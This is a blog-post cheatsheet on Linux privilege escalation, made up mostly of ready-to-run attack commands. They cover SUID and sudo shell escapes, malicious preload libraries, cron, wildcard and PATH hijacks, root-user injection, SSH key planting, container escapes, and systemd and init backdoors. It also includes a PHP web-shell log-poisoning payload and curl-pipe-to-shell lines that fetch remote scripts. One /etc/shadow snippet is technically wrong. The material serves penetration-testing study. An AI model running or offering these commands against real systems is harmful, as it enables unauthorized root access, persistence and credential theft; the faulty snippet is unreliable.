---
layout: post
title: Linux Privilege Escalation Cheatsheet
date: 2026-07-28 00:00:00 +0000
categories: [Security, Privilege Escalation]
tags: [linux, privilege-escalation, penetration-testing, suid, sudo, capabilities, kernel-exploits, container-escape, enumeration]
description: Linux privilege escalation techniques covering SUID, sudo, kernel exploits, containers, and automated tools.
image:
  path: /assets/img/posts/linux-privilege-escalation/cover.png
  alt: Linux privilege escalation cheatsheet cover
toc: true
---

> **Before you start:** these techniques only escalate privileges if the vulnerable action runs **as root**: a SUID *binary*, a root `cron`/`at` job, a `sudo`-allowed command, or a root-owned service. Running a root-owned *script* as yourself just runs as you (the kernel also ignores the setuid bit on scripts).

# Initial Enumeration

```bash
# System Info
uname -a                          # Kernel version
cat /etc/*-release                # OS/distro info
cat /proc/version                 # Kernel and compiler info
hostname                          # System name

# User Info
id                                # Current user privileges and groups
whoami                            # Current username
sudo -l                           # Check sudo privileges (critical!)
cat /etc/passwd                   # List all users
echo $PATH                        # PATH dirs (check which are writable)
env                               # Environment variables

# Files & Permissions
find / -perm -4000 2>/dev/null             # SUID binaries
find / -perm -2000 2>/dev/null             # SGID binaries
find / -writable 2>/dev/null               # World-writable files
find / -type f -name ".*" -ls 2>/dev/null  # Hidden files
getcap -r / 2>/dev/null                    # Capabilities

# Cron Jobs
cat /etc/crontab                  # Scheduled tasks
ls -la /etc/cron*                 # Cron directories
ls -la /var/spool/cron            # User-specific cron jobs

# Network
ip a                              # Network interfaces
ss -tlnp                          # Listening ports
cat /etc/hosts                    # Hosts file

# Sensitive Files
ls -la /etc/passwd /etc/shadow    # Check permissions on critical files
cat /etc/shadow 2>/dev/null       # Read shadow (if permitted)
find / -name "*.conf" -o -name "*.config" -o -name "*.ini" -o -name ".env" 2>/dev/null
```

**Key group memberships to look for:**
- `docker` gives instant root via container escape
- `lxd` gives instant root via an LXD container
- `disk` can read the raw disk, including `/etc/shadow`
- `sudo` may have unrestricted sudo access

---

# SUID/SGID & Binary Abuse

A SUID binary runs with the permissions of the file owner (usually root), regardless of who executes it.

```bash
# Find all SUID/SGID binaries
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null

# Example output:
# /usr/bin/passwd
# /usr/bin/sudo
# /usr/bin/pkexec
# /usr/bin/find           <-- interesting
# /usr/bin/vim.basic      <-- interesting
# /usr/bin/nmap           <-- interesting

# Check permissions
ls -la /usr/bin/find
# -rwsr-xr-x 1 root root 233928 Jun 15 10:00 /usr/bin/find
# The 's' in owner execute position confirms SUID
```

### Common SUID Exploits

```bash
# find
find . -exec /bin/bash -p \; -quit

# vim
vim -c ':!sh'

# python
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# nmap (older versions with --interactive)
nmap --interactive
!sh

# bash
bash -p

# less/more
less /etc/passwd
!/bin/sh

# base64 (read sensitive files)
base64 /etc/shadow | base64 -d
base64 /root/.ssh/id_rsa | base64 -d
```

> **Important:** The `-p` flag on bash/sh is critical. Without it, bash drops elevated privileges on startup as a safety feature, and you end up back as your original user.

### GTFOBins Reference

**GTFOBins** (https://gtfobins.github.io/) is a curated list of Unix binaries that can be exploited to bypass local security restrictions.

**Top binaries to always check on GTFOBins:**
`find`, `vim`, `nmap`, `python`, `bash`, `less`, `more`, `awk`, `perl`, `ruby`, `lua`, `php`, `env`, `tar`, `zip`, `base64`, `cat`, `cp`, `mv`, `nano`, `sed`, `vi`

---

# Sudo & Capabilities

### Sudo Misconfigurations

```bash
# Check sudo privileges
sudo -l

# Example output:
# User www-data may run the following commands on target:
#     (ALL) NOPASSWD: /usr/bin/vim
```

### Exploiting sudo vim

```bash
sudo vim -c ':!/bin/bash'
```

### Exploiting sudo with LD_PRELOAD

```bash
# If sudo preserves LD_PRELOAD
sudo -l
# Output shows: env_keep+=LD_PRELOAD

# Create malicious shared library
cat > /tmp/shell.c << 'EOF'
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash -p");
}
EOF

gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c

# Run any allowed sudo command with the malicious library
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/find
```

### Common Sudo Exploits via GTFOBins

| Binary  | Command                                                                          |
| ------- | -------------------------------------------------------------------------------- |
| find    | `sudo find . -exec /bin/sh \; -quit`                                            |
| vim     | `sudo vim -c ':!/bin/bash'`                                                      |
| less    | `sudo less /etc/passwd` then `!/bin/sh`                                         |
| awk     | `sudo awk 'BEGIN {system("/bin/sh")}'`                                          |
| python  | `sudo python -c 'import os; os.system("/bin/sh")'`                              |
| env     | `sudo env /bin/bash`                                                             |
| tar     | `sudo tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/sh` |
| zip     | `sudo zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/bash"`         |
| perl    | `sudo perl -e 'exec "/bin/sh";'`                                                |
| systemctl | `sudo systemctl status <svc>` opens a pager, then type `!sh` (CVE-2023-26604)     |

### Sudo CVEs

Even with no misconfiguration, the sudo binary itself has had several local-root bugs. Check the version first with `sudo --version` (or `sudo -V`).

| CVE | Affected sudo | Notes |
| --- | ------------- | ----- |
| CVE-2025-32463 ("chwoot") | 1.9.14 to 1.9.17 | **Critical (9.3).** Any local user gets root via `sudo -R`, no sudo rules required. Plant a fake `nsswitch.conf` + malicious `libnss_*.so` in a writable chroot dir. |
| CVE-2021-3156 (Baron Samedit) | 1.8.2 to 1.9.5p1 | Heap overflow reachable by any local user via `sudoedit -s`; needs an exploit binary but yields root. |
| CVE-2023-22809 (sudoedit `-e`) | 1.8.0 to 1.9.12p1 | With any `sudoedit`/`-e` right, inject a second file via `EDITOR`/`VISUAL` to edit arbitrary root-owned files. |

```bash
sudo --version | head -1          # e.g. "Sudo version 1.9.15"

# CVE-2023-22809 - smuggle an extra file into the sudoedit session
export EDITOR="vi -- /etc/sudoers"
sudoedit /etc/somefile            # /etc/sudoers also opens, so add: attacker ALL=(ALL) NOPASSWD:ALL

# CVE-2025-32463 (sudo chroot) PoC: https://github.com/pr0v3rbs/CVE-2025-32463_chwoot
# CVE-2021-3156 (Baron Samedit) PoC: https://github.com/blasty/CVE-2021-3156
```

### Linux Capabilities

Capabilities grant a binary one specific root privilege instead of full root. Admins sometimes set them thinking they are the safer option. Often they are not.

```bash
# Enumerate capabilities
getcap -r / 2>/dev/null

# Example output:
# /usr/bin/python3.11 = cap_setuid+ep
# /usr/bin/base64 = cap_dac_read_search+ep
```

### Dangerous Capabilities

```bash
# cap_setuid - can set UID to 0 (root)
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'

# cap_dac_read_search - can read any file
base64 /etc/shadow | base64 -d
base64 /root/.ssh/id_rsa | base64 -d

# Other dangerous capabilities:
# cap_net_raw   - can sniff traffic
# cap_sys_admin - can mount filesystems
# cap_bpf       - can load eBPF programs (leads to root)
# cap_sys_module - can load kernel modules
```

---

# Scheduled Tasks (cron/at)

### Cron Job Abuse

Scheduled jobs that run as root but execute a file you can write to are one of the cleanest escalation paths.

```bash
# Check crontab
cat /etc/crontab

# Example output:
# * * * * * root /opt/scripts/backup.sh

# Check if we can write to it
ls -la /opt/scripts/backup.sh
# -rwxrwxrwx 1 root root 234 Jun 15 10:00 /opt/scripts/backup.sh
# World-writable!
```

> Not every scheduled job shows up in `crontab`. Run **pspy** (`./pspy64`) to watch commands and cron jobs fire in real time, no root needed.

### Exploiting Writable Cron Jobs

```bash
# Replace the script with our payload
echo '#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash' > /opt/scripts/backup.sh

# Wait for the cron job to run (1 minute in this case)
/tmp/rootbash -p
whoami  # root
```

### Wildcard Injection

If a cron script uses wildcards (`*`) in commands like `tar` or `chown`, crafted filenames get interpreted as command-line flags:

```bash
# The payload the tar wildcard will execute
echo 'chmod +s /bin/bash' > payload.sh
chmod +x payload.sh

# Filenames that tar reads as command-line options (option injection)
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh payload.sh"

# When the root cron job runs e.g. `tar czf backup.tar.gz *` in this directory,
# tar interprets the crafted filenames as flags and runs payload.sh as root.
```

### at Job Abuse

```bash
# NOTE: `at` jobs run as the user who submits them, so scheduling a shell for
# yourself is NOT privesc. It only escalates if you can write to root's at spool
# or another user's job, or `atd` is misconfigured.
at -l                                        # Jobs you can see
ls -la /var/spool/cron/atjobs 2>/dev/null    # Writable root at jobs? (path varies by distro)
```

---

# Path & Library Hijacking

### PATH Hijacking

When a root-owned script calls a binary by name only (without absolute path), the shell searches `$PATH` directories in order and runs the first match.

```bash
# A SUID *binary* owned by root internally calls e.g. system("tar ...")
# with no absolute path, so it resolves `tar` via the attacker-controlled $PATH.
strings /usr/local/bin/backup | grep -i tar   # confirm it shells out to `tar`

# Plant a fake `tar` earlier in PATH:
echo '#!/bin/bash
/bin/bash -p' > /tmp/tar
chmod +x /tmp/tar
export PATH=/tmp:$PATH

# Run the SUID binary - its system("tar") now executes /tmp/tar with euid=root
/usr/local/bin/backup
```

### /etc/ld.so.preload Hijacking

A library in `/etc/ld.so.preload` is loaded into every dynamically-linked process, including SUID binaries.

```bash
ls -la /etc/ld.so.preload
# If writable:
echo "/tmp/evil.so" > /etc/ld.so.preload

cat > /tmp/evil.c << 'EOF'
#include <unistd.h>
__attribute__((constructor))
void init() { setuid(0); setgid(0); system("/bin/bash -p"); }
EOF
gcc -fPIC -shared -o /tmp/evil.so /tmp/evil.c -nostartfiles
```

### LD_LIBRARY_PATH / LD_AUDIT Hijacking

```bash
# If sudo preserves LD_LIBRARY_PATH
sudo -l
# env_keep+=LD_LIBRARY_PATH

cat > /tmp/evil.c << 'EOF'
#include <unistd.h>
__attribute__((constructor))
void init() { setuid(0); system("/bin/bash -p"); }
EOF
gcc -fPIC -shared -o /tmp/evil.so /tmp/evil.c -nostartfiles

sudo LD_LIBRARY_PATH=/tmp /usr/bin/vulnerable_app
sudo LD_AUDIT=/tmp/evil.so /usr/bin/find
```

### Python Library Hijacking

If a root-run Python script imports a module from a directory you can write to (a writable module beside the script, a writable entry on `sys.path`, or `PYTHONPATH` preserved by sudo), the imported code runs as root.

```bash
# Any writable directories on the import path?
python3 -c 'import sys; print("\n".join(sys.path))'
find / -writable -name '*.py' 2>/dev/null | grep -vE '/home|/tmp'

# A root job does `import helper` and helper.py (or its dir) is writable:
echo 'import os; os.system("cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash")' >> /path/to/helper.py

# If sudo keeps PYTHONPATH (env_keep+=PYTHONPATH), shadow a module the tool imports:
sudo PYTHONPATH=/tmp /usr/bin/roottool    # /tmp/<imported_module>.py runs as root
```

### glibc Dynamic Loader: Looney Tunables (CVE-2023-4911)

A buffer overflow in glibc's dynamic loader handling of the `GLIBC_TUNABLES` environment variable lets any local user load a malicious `libc` and get root. It works on **default** installs of Fedora 37/38, Ubuntu 22.04/23.04, and Debian 12/13 (glibc ≥ 2.34).

```bash
ldd --version | head -1     # fingerprint glibc

# Crash probe - a vulnerable loader SIGSEGVs, a patched one exits cleanly
env -i "GLIBC_TUNABLES=glibc.malloc.mxfast=glibc.malloc.mxfast=A" \
  "Z=$(printf '%08192d' 0)" /usr/bin/su --help >/dev/null 2>&1; echo "exit=$?"

# Public PoC: https://github.com/leesh3288/CVE-2023-4911
```

---

# File Permissions & Passwords

### Writable /etc/passwd

```bash
ls -la /etc/passwd
# If writable, add a new root user:
openssl passwd -6 -salt xyz mypassword
echo 'hacker:$6$xyz$abc123...:0:0::/root:/bin/bash' >> /etc/passwd
su hacker
```

### Writable /etc/shadow

```bash
ls -la /etc/shadow
# If writable, add a new root user:
openssl passwd -6 -salt xyz mypassword
echo 'hacker:$6$xyz$<hash>:0:0::/root:/bin/bash' >> /etc/shadow
su hacker

# Extract hashes
cat /etc/shadow | grep -v ":\*:" | grep -v ":!:"

# Crack offline
hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

### PAM Backdoor

```bash
# If you can write to PAM configs
grep -r "pam_permit" /etc/pam.d/
# pam_permit.so = accepts any password
# Add to a service's PAM config to bypass auth
```

### SSH Key Hijacking

```bash
# Find readable private keys
find / -name "id_rsa" -o -name "id_dsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null

# SSH as the key owner
chmod 600 /path/to/id_rsa
ssh -i /path/to/id_rsa user@target

# SSH agent forwarding abuse - use forwarded keys without copying
ssh-add -l                                              # List cached keys
export SSH_AUTH_SOCK=/tmp/ssh-XXXX/agent.XXXX           # Point to forwarded socket
ssh target

# Add your own key to root's authorized_keys (if writable)
echo "ssh-rsa AAAA... attacker@kali" >> /root/.ssh/authorized_keys
```

---

# Kernel Exploits

**Last resort** - can crash the system. Only use on lab/engagement targets where instability is authorized.

```bash
uname -r  # Check kernel version

# Use Linux Exploit Suggester
./linux-exploit-suggester.sh
```

### Notable Kernel Exploits

| CVE            | Name         | Description                        | Affected Kernels      |
| -------------- | ------------ | ---------------------------------- | --------------------- |
| CVE-2022-0847  | Dirty Pipe   | Overwrite read-only files          | 5.8 to 5.16.11       |
| CVE-2016-5195  | Dirty Cow    | Race condition in copy-on-write    | < 4.8.3              |
| CVE-2024-1086  | nf_tables    | Use-after-free in netfilter         | 3.15 to 6.8-rc1      |
| CVE-2023-32233 | nf_tables    | Netfilter nf_tables use-after-free  | up to 6.4-rc1        |
| CVE-2026-43284 | Dirty Frag   | xfrm/ESP page-cache write (splice)  | 4.10+                |
| CVE-2026-43499 | GhostLock    | rtmutex/futex-PI use-after-free     | 2.6.39 to 7.1-rc1    |
| CVE-2023-2640 / -32629 | GameOver(lay) | Ubuntu OverlayFS cap/xattr LPE | Ubuntu kernels        |
| CVE-2026-23111 | nf_tables    | Netfilter UAF (inverted check)      | recent (public PoC)  |

> **GameOver(lay)** (CVE-2023-2640 / CVE-2023-32629) is Ubuntu-specific but affects ~40% of Ubuntu hosts, has a one-line exploit, and can also root non-root containers, so try it first on Ubuntu targets.

---

# Container & Namespace Abuse

### Docker/LXD Abuse

```bash
# Docker group escape - mount host root filesystem
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# LXD group escape
lxc init ubuntu:16.04 exploit -c security.privileged=true
lxc config device add exploit host-root disk source=/ path=/mnt/root
lxc start exploit
lxc exec exploit /bin/sh
# Now at /mnt/root with full host access
```

### Container Escape (Advanced)

```bash
# Docker - escape via privileged container
docker run --privileged -it alpine
# Inside container:
mkdir /mnt
mount /dev/sda1 /mnt
chroot /mnt

# Docker - escape via /proc
cat /proc/1/cgroup                        # Check if in container
ls -la /proc/1/ns/                        # Namespace references

# Kubernetes - service account token abuse
cat /var/run/secrets/kubernetes.io/serviceaccount/token
curl -k https://kubernetes.default.svc:443/api/v1/namespaces/default/pods \
  -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)"

# Kubernetes - node proxy for shell on any pod
kubectl get nodes
kubectl proxy
kubectl exec -it <pod> -- /bin/sh
```

### User Namespace Escape

```bash
# Check if enabled
cat /proc/sys/kernel/unprivileged_userns_clone   # Debian/Ubuntu
# 1 = enabled

unshare --user --map-root-user
# Combine with kernel exploits (Dirty Pipe, nf_tables) to reach root
```

---

# Network & Remote Access

### NFS Root Squash Bypass

When `no_root_squash` is set, root on the NFS client maps to root on the server.

```bash
# Check NFS exports
cat /etc/exports
# /home/shared 192.168.1.0/24(rw,sync,no_root_squash)

# On attacker machine - mount and plant SUID binary
mkdir /tmp/nfs
mount -t nfs 192.168.1.10:/home/shared /tmp/nfs
cp /bin/bash /tmp/nfs/rootbash
chmod +s /tmp/nfs/rootbash

# On target - execute
./rootbash -p
```

---

# Process & Memory Abuse

### ptrace Process Injection

ptrace allows one process to inspect and modify another process's memory. If you can attach to a root process, you can inject shellcode.

```bash
# Check ptrace scope (Yama LSM)
cat /proc/sys/kernel/yama/ptrace_scope
# 0 = any process can ptrace any other
# 1 = parent only (default on many distros)
# 2 = admin only
# 3 = disabled

# If ptrace_scope = 0, find a root process
ps aux | grep root

# Attach to the process
gdb -p <root_pid>

# In gdb:
# Inject shellcode that spawns a shell
call (int)system("chmod +s /bin/bash")
```

### Core Dump & /proc Abuse

```bash
# core_pattern abuse - run arbitrary command when a process crashes
cat /proc/sys/kernel/core_pattern
echo "|/tmp/evil" > /proc/sys/kernel/core_pattern
kill -SIGSEGV <pid_of_suid_process>

# /proc/<pid>/mem - write to process memory (requires ptrace or cap_sys_ptrace)
cat /proc/<pid>/maps       # Find memory regions
```

### eBPF Privilege Abuse

eBPF programs run in kernel space. If you can load eBPF programs (cap_bpf or unprivileged eBPF enabled), you can escalate to root.

```bash
# Check if unprivileged eBPF is enabled
sysctl kernel.unprivileged_bpf_disabled
# 0 = enabled (vulnerable)
# 1 = disabled (safe)

# Check capabilities
getcap -r / 2>/dev/null | grep -E "cap_bpf|cap_perfmon"
```

### /proc/sys/kernel/modprobe_path

The kernel runs `/sbin/modprobe` when loading modules. If you can modify this path, you execute as root when a module is loaded.

```bash
# Check current value
cat /proc/sys/kernel/modprobe_path
# /sbin/modprobe

# If writable (rare, requires /proc/sys kernel write access)
echo "/tmp/evil.sh" > /proc/sys/kernel/modprobe_path

# Trigger modprobe: execute a file with unknown binary format so the kernel
# calls request_module(), which runs modprobe_path as root
printf '\xff\xff\xff\xff' > /tmp/trigger
chmod +x /tmp/trigger
/tmp/trigger 2>/dev/null
# No binfmt handler matches, so the kernel runs your script as root
```

---

# Init System & Services

### systemd Service Abuse

```bash
# Find writable service files
find /etc/systemd/system -writable 2>/dev/null
find /lib/systemd/system -writable 2>/dev/null
find /usr/lib/systemd/system -writable 2>/dev/null

# Create a malicious service
cat > /etc/systemd/system/evil.service << 'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"
[Install]
WantedBy=multi-user.target
EOF

systemctl enable evil.service
systemctl start evil.service
/tmp/rootbash -p
```

### systemd Timer Abuse

Timers are systemd's cron. A writable `.timer` (or the `.service` it triggers) runs as root on schedule.

```bash
# List active timers and what they trigger
systemctl list-timers --all

# Look for writable timer/unit files
find /etc/systemd/system /lib/systemd/system -name '*.timer' -writable 2>/dev/null
find /etc/systemd/system /lib/systemd/system -name '*.service' -writable 2>/dev/null

# If the .service run by a root timer is writable, point ExecStart at your payload:
# ExecStart=/bin/bash -c 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash'
systemctl daemon-reload
```

### SysVinit Script Abuse

Older systems using SysVinit have writable init scripts.

```bash
# Find writable init scripts
ls -la /etc/init.d/
ls -la /etc/rc?.d/

# If a script is writable, add your payload
# The script runs as root on service start/restart
echo '/bin/bash -p' >> /etc/init.d/vulnerable-service
service vulnerable-service restart
```

---

# Advanced Techniques

### Polkit / pkexec Abuse (PwnKit - CVE-2021-4034)

Polkit is used by systemd to control system-wide privileges. pkexec is a SUID root binary that runs commands as another user.

```bash
# PwnKit - pkexec local privilege escalation
# Affects most major Linux distributions (Ubuntu, Debian, RHEL, CentOS, Fedora)

# Check if vulnerable
ls -la /usr/bin/pkexec
# -rwsr-xr-x 1 root root ... /usr/bin/pkexec

# Use PwnKit exploit
./pwnkit
# uid=0(root) root
```

### Kernel Module Loading

```bash
# cap_sys_module allows loading/unloading kernel modules
# Create a reverse shell kernel module (advanced)
# Check capabilities
getcap -r / 2>/dev/null | grep cap_sys_module
```

### Log Poisoning to RCE

Log poisoning turns a log you can influence into code execution when something *else* reads that log unsafely. The most common case is a Local File Inclusion that `include()`s a web server log, or a root script/logrotate rule that executes log contents.

```bash
# Classic LFI + Apache access.log: inject PHP via the User-Agent header, then
# include the log through the LFI so the PHP is evaluated (as the web user).
curl -A '<?php system($_GET["c"]); ?>' http://target/
curl 'http://target/index.php?page=/var/log/apache2/access.log&c=id'

# auth.log variant: a poisoned SSH username lands in the log - useful only if a
# privileged script later includes/evaluates auth.log.
ssh '<?php system($_GET["c"]); ?>'@target
```

### FUSE Filesystem Abuse

FUSE lets users create filesystems in userspace. Used in container escapes and credential theft.

```bash
# Check if FUSE is available
ls /dev/fuse

# In containers with FUSE access:
sshfs user@host:/ /mnt/fuse  # If SSH access is available
```

---

# Automated Tools

| Tool      | Description                           | Command                                                    |
| --------- | ------------------------------------- | ---------------------------------------------------------- |
| **LinPEAS** | Most comprehensive Linux privesc    | `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh \| sh` |
| **LinEnum** | Classic enumeration script          | `curl -L https://github.com/rebootuser/LinEnum/raw/master/LinEnum.sh \| sh` |
| **LES**     | Linux Exploit Suggester             | `./linux-exploit-suggester.sh`                          |
| **LSE**     | Linux Smart Enumeration             | `./lse.sh`                                                  |
| **unix-privesc-check** | Standard privesc check    | `./unix-privesc-check standard`                             |
| **pspy**    | Watch cron jobs & root processes **without root** | `./pspy64`                                     |

---

# References & Resources

| Resource | Description | URL |
| -------- | ----------- | --- |
| **GTFOBins** | Curated list of Unix binaries for SUID/sudo/capabilities abuse | https://gtfobins.github.io/ |
| **HackTricks Linux PrivEsc** | Comprehensive Linux privilege escalation cheatsheet | https://book.hacktricks.xyz/linux-hardening/privilege-escalation |
| **g0tmi1k Blog** | Definitive Linux privesc methodology covering SUID, sudo, cron, kernel exploits | https://blog.g0tmi1k.com/ |
| **PayloadsAllTheThings** | Giant repository of privesc payloads and techniques | https://github.com/swisskyrepo/PayloadsAllTheThings |
| **LinPEAS** | Most comprehensive Linux privilege escalation enumeration script | https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS |
| **LinEnum** | Classic Linux enumeration script | https://github.com/rebootuser/LinEnum |
| **Linux Exploit Suggester** | Automatic kernel exploit suggestion based on OS version | https://github.com/mzet-/linux-exploit-suggester |
| **PwnKit** | pkexec local privilege escalation (CVE-2021-4034) | https://github.com/ly4k/PwnKit |
| **Dirty Pipe PoC** | Overwrite read-only files via pipe (CVE-2022-0847) | https://github.com/leesh3288/CVE-2022-0847 |
| **nf_tables PoC** | Use-after-free in netfilter (CVE-2024-1086) | https://github.com/Notselwyn/CVE-2024-1086 |
| **Kube-hunter** | Kubernetes pentesting / cluster assessment (archived, still useful for older clusters) | https://github.com/aquasecurity/kube-hunter |
| **Container Escape Tools** | PEASS-ng wiki on container escape techniques | https://github.com/peass-ng/PEASS-ng/wiki/Container-Escape |
| **BeRoot** | Python privesc enumeration for Linux and Windows | https://github.com/AlessandroZ/BeRoot |

---

> **Disclaimer:** This document is compiled for authorized penetration testing, security research, and educational purposes only. Always obtain explicit written authorization before testing on any system. Unauthorized access to computer systems is illegal and punishable by law.
